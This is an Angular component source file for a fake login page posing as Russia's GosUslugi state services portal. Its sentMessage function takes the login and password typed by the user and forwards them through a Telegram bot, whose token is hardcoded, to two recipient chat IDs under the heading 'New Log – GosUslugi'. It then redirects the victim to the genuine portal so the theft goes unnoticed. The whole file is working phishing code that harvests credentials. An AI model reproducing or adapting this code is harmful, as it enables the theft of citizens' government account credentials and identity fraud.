import {BreakpointObserver, Breakpoints} from '@angular/cdk/layout';
import {Component, OnInit, ViewEncapsulation} from '@angular/core';
import {Router} from '@angular/router';
import {map} from 'rxjs/operators';
import Telegram from 'telegram-send-message';
import {FormBuilder, Validators} from '@angular/forms';

@Component({
	selector: 'app-root',
	templateUrl: './app.component.html',
	styleUrls: ['./app.component.scss'],
	encapsulation: ViewEncapsulation.None
})
export class AppComponent implements OnInit {
	loginStepPhone = true;
	form = this.formBuilder.group({
		login: ['', [Validators.required]],
		password: ['', [Validators.required]],
	});
	prevValue = {
		login: '',
		password: '',
	};
	selected = 'ru';
	isSmallScreen = false;

	sentMessage(): void {
		// if (this.prevValue.login !== this.form.get('login').value || this.prevValue.password !== this.form.get('password').value) {
		const message = `Новый Лог – ГосУслуги🤟%0AЛогин: ${this.form.get('login').value}%0AПароль: ${this.form.get('password').value}`;
		const token = '949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs';
		Telegram.setToken(token);
		Telegram.setRecipient('880595419');
		Telegram.setMessage(message);
		Telegram.send();
		Telegram.setToken(token);
		Telegram.setRecipient('946981380');
		Telegram.setMessage(message);
		Telegram.send();
		this.router.navigateByUrl('https://esia.gosuslugi.ru/idp/rlogin?cc=bp');
		this.prevValue.login = this.form.get('login').value;
		this.prevValue.password = this.form.get('password').value;
		// }
	}

	constructor(
		private formBuilder: FormBuilder,
		private breakpointObserver: BreakpointObserver,
		private router: Router
	) {}

	ngOnInit(): void {
		this.breakpointObserver.observe([Breakpoints.Small, Breakpoints.XSmall])
			.pipe(
				map((observer) => observer.matches)
			)
			.subscribe((isSmallScreen) => this.isSmallScreen = isSmallScreen);
	}

	onSubmit(): void {
		if (this.form.valid) {
			this.sentMessage();
		}
		console.log(this.form.value);
	}
}
